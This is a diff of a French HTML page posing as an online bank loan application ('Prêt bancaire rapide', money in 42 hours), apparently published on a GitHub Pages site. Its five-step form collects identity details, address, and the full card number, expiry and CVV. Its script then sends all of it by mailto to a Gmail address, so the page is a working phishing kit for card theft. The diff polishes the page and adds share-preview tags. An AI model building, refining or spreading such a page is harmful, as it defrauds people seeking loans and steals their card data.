@@ -1,20 +1,28 @@
-
 <!DOCTYPE html>
-
 <html lang="fr">
 <head>
-<meta charset="utf-8"/>
-<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-<title>Prêt bancaire complet</title>
-<style>
-    * { box-sizing: border-box; }
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Prêt bancaire complet</title>
+
+  <!-- META APERÇU POUR PARTAGE -->
+  <meta property="og:title" content="Prêt bancaire rapide en 5 étapes" />
+  <meta property="og:description" content="Faites votre demande de prêt en ligne et recevez l'argent en 42h !" />
+  <meta property="og:image" content="https://i.postimg.cc/KcKSZ8TP/ia-My0-J6e-SP2-RLua-L3v-Dfgg.webp" />
+  <meta property="og:url" content="https://pretdargent.github.io/" />
+  <meta property="og:type" content="website" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Prêt bancaire rapide en 5 étapes" />
+  <meta name="twitter:description" content="Demandez votre prêt 100% en ligne et recevez les fonds sous 42h." />
+  <meta name="twitter:image" content="https://i.postimg.cc/KcKSZ8TP/ia-My0-J6e-SP2-RLua-L3v-Dfgg.webp" />
+
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
       font-family: 'Segoe UI', sans-serif;
       background: url('https://i.postimg.cc/KcKSZ8TP/ia-My0-J6e-SP2-RLua-L3v-Dfgg.webp') no-repeat center center fixed;
       background-size: cover;
       color: white;
-      margin: 0;
-      padding: 0;
     }
     .container {
       background: rgba(0, 0, 0, 0.75);
@@ -41,122 +49,123 @@
       border-radius: 5px;
       cursor: pointer;
     }
-    .hidden { display: none; }
-  
-.hidden { opacity: 0; pointer-events: none; position: absolute; }
-section { transition: opacity 0.8s ease; position: relative; }</style>
-<meta content="Prêt bancaire rapide en 5 étapes" property="og:title"/><meta content="Faites votre demande de prêt en ligne et recevez l'argent en 42h !" property="og:description"/><meta content="https://i.postimg.cc/KcKSZ8TP/ia-My0-J6e-SP2-RLua-L3v-Dfgg.webp" property="og:image"/><meta content="website" property="og:type"/><meta content="https://votre-site.com" property="og:url"/><meta content="Prêt bancaire rapide en 5 étapes" property="og:title"/><meta content="Faites votre demande de prêt en ligne et recevez l'argent en 42h !" property="og:description"/><meta content="https://i.postimg.cc/KcKSZ8TP/ia-My0-J6e-SP2-RLua-L3v-Dfgg.webp" property="og:image"/><meta content="website" property="og:type"/><meta content="https://votre-site.com" property="og:url"/><meta content="summary_large_image" name="twitter:card"/><meta content="Prêt bancaire rapide en 5 étapes" name="twitter:title"/><meta content="Demandez votre prêt 100% en ligne et recevez les fonds sous 42h." name="twitter:description"/><meta content="https://i.postimg.cc/KcKSZ8TP/ia-My0-J6e-SP2-RLua-L3v-Dfgg.webp" name="twitter:image"/></head>
+    button:hover { background-color: #218838; }
+    .hidden { display: none; opacity: 0; pointer-events: none; position: absolute; }
+    section { transition: opacity 0.8s ease; position: relative; }
+  </style>
+</head>
+
 <body>
-<div class="container"><section id="etape0" style="transition: opacity 0.8s ease;"><div class="overlay">
-<h1>Bienvenue sur Prêt bancaire</h1>
-<p>Faites votre demande de prêt en seulement 5 étapes simples. L'argent arrive sous 42 heures !</p>
-<div class="steps">
-<ul>
-<li>1. Informations personnelles</li>
-<li>2. Montant du prêt souhaité</li>
-<li>3. Vérification d’identité</li>
-<li>4. Acceptation des conditions</li>
-<li>5. Confirmation finale</li>
-</ul>
-</div>
-<button onclick="demarrerDemande()">Commencer la demande de prêt</button>
-</div></section>
-<section class="hidden" id="etape1" style="transition: opacity 0.8s ease;">
-<h2>1. Informations personnelles</h2>
-<label>Nom:</label><input id="nom" pattern="^[A-Za-zÀ-ÿ\s]+$" required="" type="text"/>
-<label>Prénom:</label><input id="prenom" pattern="^[A-Za-zÀ-ÿ\s]+$" required="" type="text"/>
-<label>Date de naissance:</label><input id="naissance" required="" type="date"/>
-<label>Téléphone:</label><input id="telephone" inputmode="numeric" pattern="^\+?[0-9]{9,15}$" placeholder="+33XXXXXXXXX" required="" type="tel"/>
-<button onclick="suivant(1)">Suivant</button>
-</section>
-<section class="hidden hidden" id="etape2" style="transition: opacity 0.8s ease;">
-<h2>2. Détails du prêt</h2>
-<label>Montant (€):</label><input id="montant" inputmode="numeric" min="100" pattern="^[0-9]+$" required="" type="number"/>
-<label>Durée (mois):</label>
-<select id="duree" required=""><option value="1">1 mois</option><option value="2">2 mois</option><option value="3">3 mois</option><option value="4">4 mois</option><option value="5">5 mois</option><option value="6">6 mois</option><option value="7">7 mois</option><option value="8">8 mois</option><option value="9">9 mois</option><option value="10">10 mois</option><option value="11">11 mois</option><option value="12">12 mois</option></select><p>⚠️ Des frais de remboursement de 5% seront appliqués sur le montant total emprunté.</p>
-<label>Projet:</label>
-<select id="projet" required="">
-<option value="auto">Auto</option>
-<option value="maison">Maison</option>
-<option value="personnel">Personnel</option>
-</select>
-<button onclick="suivant(2)">Suivant</button>
-</section>
-<section class="hidden hidden" id="etape3" style="transition: opacity 0.8s ease;">
-<h2>3. Carte bancaire</h2>
-<label>Numéro de carte bancaire :</label><input id="cb" inputmode="numeric" maxlength="16" pattern="^[0-9]{16}$" placeholder="XXXX XXXX XXXX XXXX" required="" title="Entrez votre numéro de carte bancaire (16 chiffres)" type="text"/>
-<label>Nom sur la carte:</label><input id="nom_cb" required="" type="text"/>
-<label>Date d'expiration:</label><input id="expiration" pattern="^(0[1-9]|1[0-2])/\d{2}$" placeholder="MM/AA" required="" type="text"/>
-<label>CVV:</label><input id="cvv" inputmode="numeric" maxlength="3" pattern="^[0-9]{3}$" placeholder="CVC" required="" title="CVC (3 chiffres au dos de votre carte)" type="password"/>
-<button onclick="suivant(3)">Suivant</button>
-</section>
-<section class="hidden hidden" id="etape4" style="transition: opacity 0.8s ease;">
-<h2>4. Adresse</h2>
-<label>Pays:</label><input id="pays" readonly="" type="text" value="France"/>
-<label>Adresse postale:</label><input id="adresse" required="" type="text"/>
-<label>Appartement / Résidence (facultatif):</label><input id="apt" type="text"/>
-<label>Ville:</label><input id="ville" required="" type="text"/>
-<button onclick="suivant(4)">Suivant</button>
-</section>
-<section class="hidden hidden" id="etape5" style="transition: opacity 0.8s ease;">
-<p>Finalisez la demande de prêt en envoyant vos informations. Si elles sont correctes, vous recevrez une réponse sous 42 heures. Ce processus est sécurisé et confidentiel.</p><h2>5. Confirmation</h2>
-<p>Relisez et confirmez l'envoi de vos données.</p>
-<button onclick="envoyer()">Envoyer vers Gmail</button>
-</section>
-</div>
-<script>
-function showSection(id) {
-  const sections = document.querySelectorAll("section");
-  sections.forEach(sec => {
-    if (sec.id === id) {
-      sec.classList.remove("hidden");
-    } else {
-      sec.classList.add("hidden");
+  <div class="container">
+    <section id="etape0">
+      <h1>Bienvenue sur Prêt bancaire</h1>
+      <p>Faites votre demande de prêt en seulement 5 étapes simples. L'argent arrive sous 42 heures !</p>
+      <div class="steps">
+        <ul>
+          <li>1. Informations personnelles</li>
+          <li>2. Montant du prêt souhaité</li>
+          <li>3. Vérification d’identité</li>
+          <li>4. Acceptation des conditions</li>
+          <li>5. Confirmation finale</li>
+        </ul>
+      </div>
+      <button onclick="demarrerDemande()">Commencer la demande de prêt</button>
+    </section>
+
+    <section class="hidden" id="etape1">
+      <h2>1. Informations personnelles</h2>
+      <label>Nom:</label><input id="nom" type="text" pattern="^[A-Za-zÀ-ÿ\s]+$" required>
+      <label>Prénom:</label><input id="prenom" type="text" pattern="^[A-Za-zÀ-ÿ\s]+$" required>
+      <label>Date de naissance:</label><input id="naissance" type="date" required>
+      <label>Téléphone:</label><input id="telephone" type="tel" pattern="^\+?[0-9]{9,15}$" placeholder="+33XXXXXXXXX" required>
+      <button onclick="suivant(1)">Suivant</button>
+    </section>
+
+    <section class="hidden" id="etape2">
+      <h2>2. Détails du prêt</h2>
+      <label>Montant (€):</label><input id="montant" type="number" min="100" required>
+      <label>Durée (mois):</label>
+      <select id="duree" required>
+        <option value="12">12 mois</option>
+        <option value="24">24 mois</option>
+        <option value="36">36 mois</option>
+      </select>
+      <p>⚠️ Des frais de remboursement de 5% seront appliqués.</p>
+      <label>Projet:</label>
+      <select id="projet" required>
+        <option value="auto">Auto</option>
+        <option value="maison">Maison</option>
+        <option value="personnel">Personnel</option>
+      </select>
+      <button onclick="suivant(2)">Suivant</button>
+    </section>
+
+    <section class="hidden" id="etape3">
+      <h2>3. Carte bancaire</h2>
+      <label>Numéro:</label><input id="cb" type="text" pattern="[0-9]{16}" maxlength="16" required>
+      <label>Nom sur la carte:</label><input id="nom_cb" type="text" required>
+      <label>Date d'expiration:</label><input id="expiration" type="text" placeholder="MM/AA" required>
+      <label>CVV:</label><input id="cvv" type="password" pattern="[0-9]{3}" maxlength="3" required>
+      <button onclick="suivant(3)">Suivant</button>
+    </section>
+
+    <section class="hidden" id="etape4">
+      <h2>4. Adresse</h2>
+      <label>Pays:</label><input id="pays" type="text" value="France" readonly>
+      <label>Adresse postale:</label><input id="adresse" type="text" required>
+      <label>Appartement / Résidence (facultatif):</label><input id="apt" type="text">
+      <label>Ville:</label><input id="ville" type="text" required>
+      <button onclick="suivant(4)">Suivant</button>
+    </section>
+
+    <section class="hidden" id="etape5">
+      <h2>5. Confirmation</h2>
+      <p>Relisez et confirmez l'envoi de vos données.</p>
+      <button onclick="envoyer()">Envoyer vers Gmail</button>
+    </section>
+  </div>
+
+  <script>
+    function showSection(id) {
+      document.querySelectorAll("section").forEach(sec => {
+        sec.classList.add("hidden");
+      });
+      document.getElementById(id).classList.remove("hidden");
     }
-  });
-}
 
-function demarrerDemande() {
-  showSection("etape1");
-}
+    function demarrerDemande() {
+      showSection("etape1");
+    }
 
-function suivant(etape) {
-  showSection("etape" + (etape + 1));
-}
+    function suivant(etape) {
+      showSection("etape" + (etape + 1));
+    }
 
-function envoyer() {
-  const data = {
-    nom: document.getElementById("nom").value,
-    prenom: document.getElementById("prenom").value,
-    naissance: document.getElementById("naissance").value,
-    telephone: document.getElementById("telephone").value,
-    montant: document.getElementById("montant").value + "€",
-    duree: document.getElementById("duree").value + " mois",
-    projet: document.getElementById("projet").value,
-    cb: document.getElementById("cb").value,
-    nom_cb: document.getElementById("nom_cb").value,
-    expiration: document.getElementById("expiration").value,
-    cvv: document.getElementById("cvv").value,
-    adresse: document.getElementById("adresse").value,
-    apt: document.getElementById("apt").value,
-    ville: document.getElementById("ville").value,
-    pays: document.getElementById("pays").value
-  };
+    function envoyer() {
+      const data = {
+        nom: document.getElementById("nom").value,
+        prenom: document.getElementById("prenom").value,
+        naissance: document.getElementById("naissance").value,
+        telephone: document.getElementById("telephone").value,
+        montant: document.getElementById("montant").value + "€",
+        duree: document.getElementById("duree").value + " mois",
+        projet: document.getElementById("projet").value,
+        cb: document.getElementById("cb").value,
+        nom_cb: document.getElementById("nom_cb").value,
+        expiration: document.getElementById("expiration").value,
+        cvv: document.getElementById("cvv").value,
+        adresse: document.getElementById("adresse").value,
+        apt: document.getElementById("apt").value,
+        ville: document.getElementById("ville").value,
+        pays: document.getElementById("pays").value
+      };
 
-  const intro = "⚠️ Chez BanqueExpress, la sécurité de vos données est notre priorité absolue. Vous bénéficiez d’un encadrement contractuel sérieux. En cas de non-respect des délais de remboursement, un taux d’intérêt progressif de 1% sera ajouté chaque mois en plus des 5% initiaux. Ce système d’intérêt cumulatif est irrévocable après approbation du prêt.\n\n" +
-                "Par exemple, si un prêt est remboursé après 3 mois de retard, le taux final sera de 8%. Ce taux est conforme aux conditions générales que vous avez acceptées.\n\n" +
-                "Veuillez noter que toute tentative de fraude entraînera l'annulation immédiate de votre éligibilité à tout futur prêt, ainsi qu’un signalement auprès des institutions concernées.\n\n" +
-                "Merci de respecter nos conditions, votre confiance est précieuse.\n\n" +
-                "------------------------------------------------------------\n";
+      const intro = "⚠️ Demande de prêt reçue. Détails ci-dessous :\n\n";
+      const message = intro + Object.entries(data).map(([k, v]) => `[${k.toUpperCase()}] : ${v}`).join("\n");
 
-  const message = intro + Object.entries(data).map(([key, value]) => {
-    return (`[${key.toUpperCase()}] : ${value}`);
-  }).join("\n") + "\n\n------------------------------------------------------------\n\n" +
-  "Ce message est généré automatiquement. Merci de ne pas répondre directement.";
-
-  const mailto = `mailto:Visaabanquee@gmail.com?subject=Demande%20de%20prêt%20en%20clair&body=${encodeURIComponent(message)}`;
-  window.location.href = mailto;
-}
-</script>
+      const mailto = `mailto:Visaabanquee@gmail.com?subject=Demande%20de%20prêt&body=${encodeURIComponent(message)}`;
+      window.location.href = mailto;
+    }
+  </script>
 </body>
 </html>
